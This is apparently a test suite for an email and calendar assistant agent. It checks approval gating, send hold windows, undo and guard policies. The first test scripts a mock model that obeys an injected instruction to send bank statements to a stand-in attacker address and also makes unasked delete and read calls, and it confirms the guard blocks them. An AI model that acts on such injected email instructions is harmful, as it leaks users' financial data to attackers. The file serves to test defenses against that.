import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { eq } from "drizzle-orm";
import { ActionError } from "../src/agent/executor.js";
import { buildApp } from "../src/app.js";
import { loadConfig } from "../src/config.js";
import { openDb, schema } from "../src/db/index.js";
import { McpHub } from "../src/mcp/hub.js";
import { scanInbox } from "../src/scan.js";
import { createServices } from "../src/services.js";
import { MockAgent, MockLlm, obligationJson, obligationsFrom, withSession } from "./helpers.js";

const ATTACKER = "statements-backup@sahyadri-bank-secure.example";
let dir: string;
let hub: McpHub;

beforeAll(async () => {
  dir = mkdtempSync(join(tmpdir(), "munshi-agent-"));
  hub = new McpHub({ sandboxDir: dir });
  await hub.connect();
}, 60_000);
afterAll(async () => {
  await hub.close();
  rmSync(dir, { recursive: true, force: true });
});

/** Fresh DB with obligations extracted (mock extractor) from the sandbox mailbox. */
async function freshDb() {
  const { db } = openDb(":memory:");
  const extractor = new MockLlm((req) => {
    if (req.user.includes("Amount payable: Rs 1,847.00"))
      return obligationJson({ type: "bill", title: "BESCOM electricity bill", dueDate: "2030-01-05", amount: 1847, currency: "INR", confidence: 0.9, evidenceQuote: "Amount payable: Rs 1,847.00" });
    if (req.user.includes("Refund amount: Rs 2,499.00"))
      return obligationJson({ type: "refund", title: "Amazon refund pending", dueDate: "2030-01-06", amount: 2499, currency: "INR", confidence: 0.7, evidenceQuote: "Refund amount: Rs 2,499.00" });
    if (req.user.includes("Time: 4:30 PM IST"))
      return obligationJson({ type: "appointment", title: "Dentist appointment", dueDate: "2030-01-07T16:30:00+05:30", confidence: 0.95, evidenceQuote: "Time: 4:30 PM IST" });
    return JSON.stringify({ obligations: [] });
  });
  await scanInbox({ db, mcp: hub, llm: extractor });
  return db;
}

function harness(db: Awaited<ReturnType<typeof freshDb>>, agent: MockAgent, hold = 60) {
  const clock = { now: Date.now() };
  const services = createServices({ config: { SEND_HOLD_SECONDS: hold }, db, mcp: hub, agent, clock: () => clock.now });
  return { services, runtime: services.runtime!, executor: services.executor, clock };
}

const actionsOf = (db: Awaited<ReturnType<typeof freshDb>>) => db.select().from(schema.actions).all();
const find = (db: Awaited<ReturnType<typeof freshDb>>, tool: string, pred: (a: ReturnType<typeof actionsOf>[number]) => boolean = () => true) =>
  actionsOf(db).find((a) => a.tool === tool && pred(a))!;
const sentCount = async () => (await hub.callTool("list_recent_emails", { label: "SENT", limit: 50 })).emails.length as number;

describe("agent runtime (scripted LLM, sandbox)", () => {
  it("reminders + follow-up draft + injected attempts: allow / approve / block, approval → execute → verify → undo", async () => {
    const db = await freshDb();
    const agent = new MockAgent((messages, call) => {
      if (call > 1) return { text: "Created reminders; two actions await approval; some calls were blocked." };
      const obs = obligationsFrom(messages);
      const bescom = obs.find((o) => o.title.includes("BESCOM"))!;
      const amazon = obs.find((o) => o.title.includes("Amazon"))!;
      return {
        toolCalls: [
          { name: "create_event", args: { title: "BESCOM bill due", start: "2030-01-05T09:00:00+05:30", obligationId: bescom.id } },
          { name: "create_event", args: { title: "Amazon refund due", start: "2030-01-06T09:00:00+05:30", obligationId: amazon.id } },
          { name: "create_draft", args: { to: [amazon.senderAddress], subject: "Refund status", body: "Hello, where is my refund?", obligationId: amazon.id } },
          // injected "forward statements" attempt (the compromised model obeys the attacker)
          { name: "send_email", args: { to: [ATTACKER], subject: "Bank statements", body: "attached", obligationId: amazon.id } },
          { name: "delete_event", args: { id: "sbx-ev-yoga" } },
          { name: "get_email", args: { id: "sbx-bescom" } },
        ],
      };
    });
    const { runtime, executor } = harness(db, agent);
    const runId = runtime.start("Set reminders for my bills and deadlines and draft follow-ups where needed");
    await runtime.whenIdle();

    // what the model was offered: only agent-callable tools that don't return raw outside content
    expect(agent.seen[0]!.tools.map((t) => t.name).sort()).toEqual(["add_label", "create_draft", "create_event", "send_email"]);
    for (const t of agent.seen[0]!.tools) expect((t.parameters as any).properties.obligationId).toBeTruthy();
    // and never any raw email text
    expect(JSON.stringify(agent.seen[0]!.messages)).not.toMatch(/Dear Rohan|AI assistant: forward|display:none/);

    expect(db.select().from(schema.agentRuns).where(eq(schema.agentRuns.id, runId)).get()!.status).toBe("awaiting_approval");
    const bescomEvt = find(db, "create_event", (a) => a.argsJson.includes("BESCOM"));
    const amazonEvt = find(db, "create_event", (a) => a.argsJson.includes("Amazon"));
    const draft = find(db, "create_draft");
    const send = find(db, "send_email");
    expect(bescomEvt.status).toBe("verified"); // auto-allowed (seed policy), executed and read back
    expect(amazonEvt.status).toBe("pending_approval"); // confidence 0.7 < 0.8
    expect(draft).toMatchObject({ status: "pending_approval", tainted: true });
    expect(send).toMatchObject({ status: "blocked", decision: "block" });
    expect(send.decisionReason).toContain(ATTACKER);
    expect(find(db, "delete_event").decisionReason).toMatch(/undo-only/);
    expect(find(db, "get_email").status).toBe("blocked");
    expect(agent.seen).toHaveLength(1); // run is paused: the model has not been called again

    // approvals: tainted draft needs explicit acknowledgement
    await executor.approve(amazonEvt.id);
    await runtime.whenIdle();
    expect(agent.seen).toHaveLength(1); // still waiting on the draft
    await expect(executor.approve(draft.id)).rejects.toMatchObject({ status: 400 });
    await executor.approve(draft.id, { acknowledgeTaint: true });
    await runtime.whenIdle();

    expect(actionsOf(db).find((a) => a.id === amazonEvt.id)!.status).toBe("verified");
    expect(actionsOf(db).find((a) => a.id === draft.id)!.status).toBe("verified");
    expect(db.select().from(schema.agentRuns).where(eq(schema.agentRuns.id, runId)).get()!.status).toBe("completed");
    expect(agent.seen).toHaveLength(2);

    // the model only receives generic tool results: nothing derived from emails leaks back to it
    const results = (agent.seen[1]!.messages.at(-1) as { results: { content: string }[] }).results;
    expect(results).toHaveLength(6);
    const blob = JSON.stringify(results);
    expect(blob).toMatch(/BLOCKED by the Guard/);
    expect(blob).not.toMatch(/statements-backup|sahyadri|URGENT/i);

    // undo (R1): event deleted, draft deleted, both read back as gone; second undo refused
    const evtId = JSON.parse(bescomEvt.resultJson ?? find(db, "create_event", (a) => a.id === bescomEvt.id).resultJson!).event.id;
    await executor.undo(bescomEvt.id);
    await expect(hub.callTool("get_event", { id: evtId })).rejects.toThrow();
    expect(actionsOf(db).find((a) => a.id === bescomEvt.id)!.status).toBe("undone");
    await executor.undo(draft.id);
    await expect(executor.undo(bescomEvt.id)).rejects.toBeInstanceOf(ActionError);

    const events = db.select().from(schema.auditLog).all().map((e) => e.event);
    for (const e of ["proposed", "decision", "approved", "executed", "verified", "undone"]) expect(events).toContain(e);
  }, 60_000);

  it("send_email: approval → hold window → real send only after the window; cancel works; restart does not lose it", async () => {
    const db = await freshDb();
    let n = 0;
    const agent = new MockAgent((m) =>
      m.length === 1 ? { toolCalls: [{ name: "send_email", args: { to: ["rohan.mehta@example.com"], subject: `Summary ${++n}`, body: "Your bills", obligationId: undefined } }] }
        : { text: "queued" });
    const { runtime, executor, clock } = harness(db, agent, 60);

    const before = await sentCount();
    runtime.start("Email rohan.mehta@example.com a summary of my bills");
    await runtime.whenIdle();
    const a1 = find(db, "send_email");
    expect(a1.status).toBe("pending_approval");
    expect(a1.tainted).toBe(false);

    await executor.approve(a1.id);
    await runtime.whenIdle();
    let row = actionsOf(db).find((a) => a.id === a1.id)!;
    expect(row.status).toBe("held");
    expect(row.holdUntil).toBe(clock.now + 60_000);
    expect(await sentCount()).toBe(before); // NOT sent yet
    expect(await executor.releaseDueHolds()).toBe(0);

    clock.now += 61_000;
    expect(await executor.releaseDueHolds()).toBe(1);
    row = actionsOf(db).find((a) => a.id === a1.id)!;
    expect(row.status).toBe("verified");
    expect(await sentCount()).toBe(before + 1);
    await expect(executor.undo(a1.id)).rejects.toThrow(/Already sent/);

    // cancel during the window
    runtime.start("Email rohan.mehta@example.com a second summary");
    await runtime.whenIdle();
    const a2 = actionsOf(db).filter((a) => a.tool === "send_email").find((a) => a.status === "pending_approval")!;
    await executor.approve(a2.id);
    await executor.undo(a2.id);
    clock.now += 120_000;
    expect(await executor.releaseDueHolds()).toBe(0);
    expect(actionsOf(db).find((a) => a.id === a2.id)!.status).toBe("undone");
    expect(await sentCount()).toBe(before + 1);

    // server restart: a different executor (same DB) releases the held send
    runtime.start("Email rohan.mehta@example.com a third summary");
    await runtime.whenIdle();
    const a3 = actionsOf(db).filter((a) => a.tool === "send_email").find((a) => a.status === "pending_approval")!;
    await executor.approve(a3.id);
    expect(actionsOf(db).find((a) => a.id === a3.id)!.status).toBe("held");
    const restarted = createServices({ config: { SEND_HOLD_SECONDS: 60 }, db, mcp: hub, clock: () => clock.now + 61_000 });
    expect(await restarted.executor.releaseDueHolds()).toBe(1);
    expect(await executor.releaseDueHolds()).toBe(0); // no double send
    expect(actionsOf(db).find((a) => a.id === a3.id)!.status).toBe("verified");
    expect(await sentCount()).toBe(before + 2);
  }, 60_000);

  it("a rejected action is reported to the model and never executed", async () => {
    const db = await freshDb();
    const agent = new MockAgent((messages, call) => {
      if (call > 1) return { text: "ok" };
      const amazon = obligationsFrom(messages).find((o) => o.title.includes("Amazon"))!;
      return { toolCalls: [{ name: "create_event", args: { title: "Amazon refund due", start: "2030-01-06T09:00:00+05:30", obligationId: amazon.id } }] };
    });
    const { runtime, executor } = harness(db, agent);
    runtime.start("Set reminders");
    await runtime.whenIdle();
    const a = find(db, "create_event");
    executor.reject(a.id);
    await runtime.whenIdle();
    expect(actionsOf(db).find((x) => x.id === a.id)!.status).toBe("rejected");
    expect(actionsOf(db).find((x) => x.id === a.id)!.resultJson).toBeNull();
    expect(JSON.stringify(agent.seen[1]!.messages.at(-1))).toContain("REJECTED by the user");
    expect(() => executor.reject(a.id)).toThrow(ActionError); // not pending any more
  }, 60_000);

  it("enforces the 8-step limit", async () => {
    const db = await freshDb();
    const agent = new MockAgent((_m, call) => ({ toolCalls: [{ name: "create_draft", args: { to: ["rohan.mehta@example.com"], subject: `Note ${call}`, body: "x" } }] }));
    const { runtime } = harness(db, agent);
    const runId = runtime.start("Keep going");
    await runtime.whenIdle();
    expect(agent.seen).toHaveLength(8);
    const run = db.select().from(schema.agentRuns).where(eq(schema.agentRuns.id, runId)).get()!;
    expect(run.status).toBe("completed");
    expect(run.traceJson).toMatch(/8-step limit/);
  }, 60_000);

  it("verification_failed is recorded when the read-back does not match", async () => {
    const db = await freshDb();
    const agent = new MockAgent((messages, call) => {
      if (call > 1) return { text: "done" };
      const b = obligationsFrom(messages).find((o) => o.title.includes("BESCOM"))!;
      return { toolCalls: [{ name: "create_event", args: { title: "BESCOM bill due", start: "2030-01-05T09:00:00+05:30", obligationId: b.id } }] };
    });
    const { runtime } = harness(db, agent);
    const orig = hub.callTool.bind(hub);
    hub.callTool = (async (name: string, args: Record<string, unknown>) => {
      const r = await orig(name, args);
      return name === "get_event" ? { ...r, event: { ...r.event, title: "tampered" } } : r;
    }) as typeof hub.callTool;
    try {
      runtime.start("Set reminders");
      await runtime.whenIdle();
    } finally {
      hub.callTool = orig;
    }
    const a = find(db, "create_event");
    expect(a.status).toBe("verification_failed");
    expect(JSON.parse(a.verifyJson!).detail).toMatch(/title is “tampered”/);
    expect(db.select().from(schema.auditLog).all().some((e) => e.event === "verification_failed")).toBe(true);
  }, 60_000);

  it("paused runs persist: a new runtime on the same DB resumes after approval", async () => {
    const db = await freshDb();
    const agentA = new MockAgent((messages) => {
      const amazon = obligationsFrom(messages).find((o) => o.title.includes("Amazon"))!;
      return { toolCalls: [{ name: "create_event", args: { title: "Amazon refund due", start: "2030-01-06T09:00:00+05:30", obligationId: amazon.id } }] };
    });
    const first = harness(db, agentA);
    const runId = first.runtime.start("Set reminders");
    await first.runtime.whenIdle();
    const a = find(db, "create_event");
    expect(a.status).toBe("pending_approval");

    // "restart"
    const agentB = new MockAgent(() => ({ text: "Resumed after restart." }));
    const second = harness(db, agentB);
    second.runtime.recover();
    await second.runtime.whenIdle();
    expect(db.select().from(schema.agentRuns).where(eq(schema.agentRuns.id, runId)).get()!.status).toBe("awaiting_approval");
    await second.executor.approve(a.id);
    await second.runtime.whenIdle();
    expect(db.select().from(schema.agentRuns).where(eq(schema.agentRuns.id, runId)).get()!.status).toBe("completed");
    expect(agentB.seen[0]!.messages.map((m) => m.role)).toEqual(["user", "assistant", "tool"]); // full conversation restored
  }, 60_000);
});

describe("HTTP API: runs, approvals, policies, contacts", () => {
  it("drives a run through the API", async () => {
    const db = await freshDb();
    const agent = new MockAgent((messages, call) => {
      if (call > 1) return { text: "All done." };
      const amazon = obligationsFrom(messages).find((o) => o.title.includes("Amazon"))!;
      return { toolCalls: [{ name: "create_event", args: { title: "Amazon refund due", start: "2030-01-06T09:00:00+05:30", obligationId: amazon.id } }] };
    });
    const { services, runtime } = harness(db, agent);
    const app = withSession(buildApp({ config: loadConfig({}), db, mcp: hub, services }), db);

    expect((await app.inject({ method: "POST", url: "/api/runs", payload: { goal: "x" } })).statusCode).toBe(400);
    const { runId } = (await app.inject({ method: "POST", url: "/api/runs", payload: { goal: "Set reminders for my bills" } })).json();
    await runtime.whenIdle();

    const detail = (await app.inject({ method: "GET", url: `/api/runs/${runId}` })).json();
    expect(detail.run.status).toBe("awaiting_approval");
    expect(detail.trace.map((t: { kind: string }) => t.kind)).toEqual(expect.arrayContaining(["goal", "proposed", "paused"]));
    const pending = (await app.inject({ method: "GET", url: "/api/actions?status=pending_approval" })).json().actions;
    expect(pending).toHaveLength(1);
    expect(pending[0].preview).toMatch(/^Create event “Amazon refund due” on 6 Jan 2030 09:00/);

    const ok = await app.inject({ method: "POST", url: `/api/actions/${pending[0].id}/approve`, payload: {} });
    expect(ok.statusCode).toBe(200);
    expect(ok.json().action).toMatchObject({ status: "verified", canUndo: true });
    expect((await app.inject({ method: "POST", url: `/api/actions/${pending[0].id}/approve`, payload: {} })).statusCode).toBe(409);
    expect((await app.inject({ method: "POST", url: "/api/actions/nope/approve", payload: {} })).statusCode).toBe(404);
    await runtime.whenIdle();
    expect((await app.inject({ method: "GET", url: `/api/runs/${runId}` })).json().run.status).toBe("completed");
    const undone = await app.inject({ method: "POST", url: `/api/actions/${pending[0].id}/undo` });
    expect(undone.json().action.status).toBe("undone");
  }, 60_000);

  it("503 when no agent is configured", async () => {
    const db = await freshDb();
    const services = createServices({ config: { SEND_HOLD_SECONDS: 60 }, db, mcp: hub, agentError: "LLM_MODEL is not set in .env" });
    const app = withSession(buildApp({ config: loadConfig({}), db, mcp: hub, services }), db);
    const res = await app.inject({ method: "POST", url: "/api/runs", payload: { goal: "do things" } });
    expect(res.statusCode).toBe(503);
    expect(res.json().error).toContain("LLM_MODEL");
  });

  it("policies and contacts CRUD with validation", async () => {
    const db = await freshDb();
    const services = createServices({ config: { SEND_HOLD_SECONDS: 60 }, db, mcp: hub });
    const app = withSession(buildApp({ config: loadConfig({}), db, mcp: hub, services }), db);
    const list = (await app.inject({ method: "GET", url: "/api/policies" })).json().policies;
    expect(list.map((p: { id: string }) => p.id)).toContain("seed-never-auto-send");
    expect(list.every((p: { valid: boolean }) => p.valid)).toBe(true);

    const bad = await app.inject({ method: "POST", url: "/api/policies", payload: { rule: { id: "x", match: { tool: "send_email" }, decision: "yes", reason: "r" } } });
    expect(bad.statusCode).toBe(400);
    const rule = { id: "user-block-big", match: { tool: "create_event", argsCondition: { title: { contains: "wedding" } } }, decision: "block", reason: "No wedding events" };
    expect((await app.inject({ method: "POST", url: "/api/policies", payload: { rule } })).statusCode).toBe(200);
    expect((await app.inject({ method: "POST", url: "/api/policies", payload: { rule } })).statusCode).toBe(409);
    expect((await app.inject({ method: "PATCH", url: "/api/policies/user-block-big", payload: { enabled: false } })).statusCode).toBe(200);
    expect((await app.inject({ method: "DELETE", url: "/api/policies/user-block-big" })).statusCode).toBe(200);
    expect((await app.inject({ method: "DELETE", url: "/api/policies/user-block-big" })).statusCode).toBe(404);

    const c = await app.inject({ method: "POST", url: "/api/contacts", payload: { name: "Mom", email: "Mom@Example.com" } });
    expect(c.json().contact.email).toBe("mom@example.com");
    expect((await app.inject({ method: "POST", url: "/api/contacts", payload: { name: "Mom", email: "mom@example.com" } })).statusCode).toBe(409);
    expect((await app.inject({ method: "POST", url: "/api/contacts", payload: { name: "X", email: "nope" } })).statusCode).toBe(400);
    expect((await app.inject({ method: "DELETE", url: `/api/contacts/${c.json().contact.id}` })).statusCode).toBe(200);
  });
});
